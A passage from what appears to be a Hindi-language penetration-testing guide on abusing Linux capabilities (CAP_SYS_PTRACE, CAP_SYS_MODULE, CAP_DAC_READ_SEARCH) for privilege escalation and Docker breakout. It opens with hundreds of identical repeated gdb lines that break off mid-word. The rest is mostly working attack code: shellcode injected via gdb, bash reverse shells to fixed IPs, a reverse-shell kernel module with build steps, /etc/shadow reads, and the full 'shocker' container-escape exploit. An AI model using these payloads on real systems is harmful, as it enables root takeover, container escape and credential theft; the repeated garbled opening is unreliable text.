catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall cap
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**उदाहरण वातावरण के साथ (Docker ब्रेकआउट) - एक और gdb दुरुपयोग**

यदि **GDB** स्थापित है (या आप इसे `apk add gdb` या `apt install gdb` के साथ स्थापित कर सकते हैं), तो आप **मेजबान से प्रक्रिया को डीबग कर सकते हैं** और इसे `system` फ़ंक्शन को कॉल करने के लिए बना सकते हैं। (यह तकनीक भी क्षमता `SYS_ADMIN` की आवश्यकता होती है)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
आप निष्पादित कमांड के आउटपुट को नहीं देख पाएंगे, लेकिन वह प्रक्रिया द्वारा निष्पादित किया जाएगा (इसलिए एक रेव शेल प्राप्त करें)।

{% hint style="warning" %}
यदि आपको त्रुटि "No symbol "system" in current context." मिलती है, तो gdb के माध्यम से एक प्रोग्राम में शैलकोड लोड करने के पिछले उदाहरण की जांच करें।
{% endhint %}

**पर्यावरण के साथ उदाहरण (डॉकर ब्रेकआउट) - शैलकोड इंजेक्शन**

आप डॉकर कंटेनर के अंदर सक्षम क्षमताओं की जांच करने के लिए निम्नलिखित का उपयोग कर सकते हैं:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
# CAP_SYS_MODULE

[CAP_SYS_MODULE](https://man7.org/linux/man-pages/man7/capabilities.7.html) प्रक्रिया को कर्नल मॉड्यूल्स (`init_module(2)`, `finit_module(2)` और `delete_module(2)` सिस्टम कॉल) को लोड और अनलोड करने की अनुमति देता है। इससे सरल विशेषाधिकार उन्नयन और रिंग-0 संकट हो सकता है। कर्नल को इच्छानुसार संशोधित किया जा सकता है, जिससे सभी सिस्टम सुरक्षा, लिनक्स सुरक्षा मॉड्यूल और कंटेनर सिस्टम परिवर्तित हो जाते हैं।\
**इसका मतलब है कि आप होस्ट मशीन के कर्नल में कर्नल मॉड्यूल डाल सकते हैं/निकाल सकते हैं।**

**बाइनरी के साथ उदाहरण**

निम्नलिखित उदाहरण में बाइनरी **`python`** के पास यह क्षमता है।
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
डिफ़ॉल्ट रूप से, **`modprobe`** कमांड **`/lib/modules/$(uname -r)`** नामक निर्देशिका में डिपेंडेंसी सूची और मैप फ़ाइल की जांच करता है।\
इसे दुरुपयोग करने के लिए, चलो एक नकली **lib/modules** फ़ोल्डर बनाते हैं:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
तो **कर्नल मॉड्यूल को कंपाइल करें, नीचे 2 उदाहरण दिए गए हैं और** इस फ़ोल्डर में कॉपी करें:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
अंत में, इस कर्नल मॉड्यूल को लोड करने के लिए आवश्यक पायथन कोड को निष्पादित करें:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**उदाहरण 2 बाइनरी के साथ**

निम्नलिखित उदाहरण में बाइनरी **`kmod`** के पास यह क्षमता है।
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
जिसका मतलब है कि कर्नल मॉड्यूल डालने के लिए कमांड **`insmod`** का उपयोग किया जा सकता है। इस विशेषांक का दुरुपयोग करके एक **रिवर्स शैल** प्राप्त करने के लिए नीचे दिए गए उदाहरण का पालन करें।

**पर्यावरण के साथ उदाहरण (Docker ब्रेकआउट)**

आप डॉकर कंटेनर में सक्षम क्षमताओं की जांच करने के लिए निम्नलिखित का उपयोग कर सकते हैं:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
पिछले आउटपुट में आप देख सकते हैं कि **SYS\_MODULE** क्षमता सक्षम है।

**करेनल मॉड्यूल** बनाएं जो एक रिवर्स शेल चलाएगा और इसे **कंपाइल** करने के लिए **Makefile** बनाएं:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Makefile में हर शब्द के पहले रिक्त चरित्र **टैब होना चाहिए, न कि स्पेसेस**!
{% endhint %}

इसे कंपाइल करने के लिए `make` को निष्पादित करें।
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
अंत में, एक शैल में `nc` शुरू करें और दूसरे शैल से **मॉड्यूल लोड** करें और आप nc प्रक्रिया में शैल को कैप्चर करेंगे:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**इस तकनीक का कोड "Abusing SYS\_MODULE Capability" के प्रयोगशाला से कॉपी किया गया था** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

इस तकनीक का एक और उदाहरण [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) में दिया गया है

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) प्रक्रिया को **फ़ाइल पढ़ने, और निर्देशिका पढ़ने और निर्देशिका को पढ़ने और निष्पादन करने की अनुमति** देता है। जबकि इसे फ़ाइलों को खोजने या पढ़ने के लिए उपयोग करने के लिए डिज़ाइन किया गया था, यह प्रक्रिया को `open_by_handle_at(2)` को आह्वान करने की अनुमति भी देता है। किसी भी प्रक्रिया के पास `CAP_DAC_READ_SEARCH` क्षमता होने पर वह `open_by_handle_at(2)` का उपयोग करके किसी भी फ़ाइल तक पहुंच प्राप्त कर सकती है, यहां तक कि उनके माउंट नेमस्पेस के बाहर की फ़ाइलें भी। `open_by_handle_at(2)` में पारित हैंडल को `name_to_handle_at(2)` का उपयोग करके प्राप्त किया जाना चाहिए। हालांकि, यह हैंडल गोपनीय और छेड़छाड़ के योग्य जानकारी, जैसे इनोड नंबर, को शामिल करता है। यह Docker कंटेनर में सबसे पहले Sebastian Krahmer द्वारा [shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) अपशब्द के द्वारा एक मुद्दा साबित हुआ।\
**इसका मतलब है कि आप फ़ाइल पढ़ने की अनुमति जांच और निर्देशिका पढ़ने / निष्पादन की अनुमति जांच को छोड़कर जा सकते हैं।**

**बाइनरी के साथ उदाहरण**

बाइनरी किसी भी फ़ाइल को पढ़ सकेगा। इसलिए, यदि एक फ़ाइल जैसे tar के पास इस क्षमता होती है तो यह shadow फ़ाइल को पढ़ सकेगा:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**बाइनरी 2 के साथ उदाहरण**

इस मामले में मान लें कि **`python`** बाइनरी के पास यह क्षमता है। रूट फ़ाइलों की सूची देखने के लिए आप यह कर सकते हैं:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
और फ़ाइल को पढ़ने के लिए आप कर सकते हैं:
```python
print(open("/etc/shadow", "r").read())
```
**पर्यावरण में उदाहरण (Docker ब्रेकआउट)**

आप निम्नलिखित कमांड का उपयोग करके डॉकर कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
पिछले आउटपुट में आप देख सकते हैं कि **DAC\_READ\_SEARCH** क्षमता सक्षम है। इसके परिणामस्वरूप, कंटेनर **प्रक्रियाओं को डीबग कर सकता है**।

आप यहां जान सकते हैं कि निम्नलिखित उत्पादन कैसे काम करता है: [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) लेकिन संक्षेप में कहें तो **CAP\_DAC\_READ\_SEARCH** हमें अनुमति के बिना फ़ाइल सिस्टम को चलाने की अनुमति नहीं देता ही है, बल्कि यह विशेष रूप से _**open\_by\_handle\_at(2)**_ और **हमारी प्रक्रिया को अन्य प्रक्रियाओं द्वारा खोली गई संवेदनशील फ़ाइलों की अनुमति देने वाली किसी भी जांच को हटा सकता है**।

मूल उत्पादन जो इस अनुमति का दुरुपयोग करके होस्ट से फ़ाइलें पढ़ने का उपयोग करता है, यहां मिल सकता है: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), निम्नलिखित एक **संशोधित संस्करण है जो आपको पढ़ना चाहिए फ़ाइल को पहले तर्क के रूप में दर्ज करने और इसे एक फ़ाइल में डंप करने की अनुमति देता है**।
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
मुझे किसी चीज़ के पॉइंटर को ढूंढ़ने के लिए एक एक्सप्लॉइट की आवश्यकता होती है जो होस्ट पर माउंट की गई हो। मूल एक्सप्लॉइट में फ़ाइल /.dockerinit का उपयोग किया गया था और इस संशोधित संस्करण में /etc/hostname का उपयोग किया जाता है। यदि एक्सप्लॉइट काम नहीं कर रहा है तो शायद आपको एक अलग फ़ाइल सेट करने की आवश्यकता हो सकती है। होस्ट में माउंट की गई फ़ाइल ढूंढ़ने के लिए बस माउंट कमांड को चलाएं:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**इस तकनीक का कोड "Abusing DAC\_READ\_SEARCH Capability" के प्रयोगशाला से कॉपी किया गया था** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में सबसे महत्वपूर्ण साइबर सुरक्षा इवेंट है और यूरोप में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने** की मिशन के साथ, यह कांग्रेस प्रौद्योगिकी और साइबर सुरक्षा विशेषज्ञों के लिए हर विषय में एक उबलता हुआ मिलने का समय है।

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**इसका मतलब है कि आप किसी भी फ़ाइल पर लिखने की अनुमति की जांच को छोड़ सकते हैं, इसलिए आप किसी भी फ़ाइल पर लिख सकते हैं।**

